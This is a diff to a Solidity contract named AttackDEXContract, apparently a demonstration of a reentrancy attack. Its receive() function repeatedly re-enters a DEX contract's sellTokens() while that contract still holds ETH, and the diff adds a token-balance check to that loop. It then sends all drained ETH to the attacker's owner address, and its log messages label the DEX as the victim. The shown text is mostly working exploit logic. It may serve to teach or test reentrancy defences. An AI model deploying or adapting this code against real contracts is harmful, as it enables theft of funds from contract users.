@@ -30,8 +30,8 @@ contract AttackDEXContract {
   }
 
   receive() external payable {
-    // Reentrant the DEX Contract as long as it has enough ETHs on its balance!
-    if (address(dexContract).balance >= sellTokensAmount) {
+    // Reentrant the DEX Contract as long as it has enough ETHs on its balance && the attacker contract's token balance is enough to reenter the sellTokens() function
+    if ((address(dexContract).balance >= sellTokensAmount) && (tokenContract.balanceOf(address(this)) > sellTokensAmount)) {
       console.log("");
       console.log("From Attacker contract: Reentring the Victim Contract");
       console.log("DEX Contract ETH Balance: ", address(dexContract).balance);
@@ -40,7 +40,7 @@ contract AttackDEXContract {
       dexContract.sellTokens(sellTokensAmount);
     } else {
       console.log("");
-      console.log("Victim Contract's ETH Balance has been depleted");
+      console.log("Attacker contract can't continue reentering the Victim contract, thus, sending all the ETH that was collected");
       
       // When the victim contract has no more ETHs, the attack is completed, and all the ETH that was taken during the attack will be sent to the attacker's account! 
       (bool success, ) = payable(owner).call{value: address(this).balance }("");
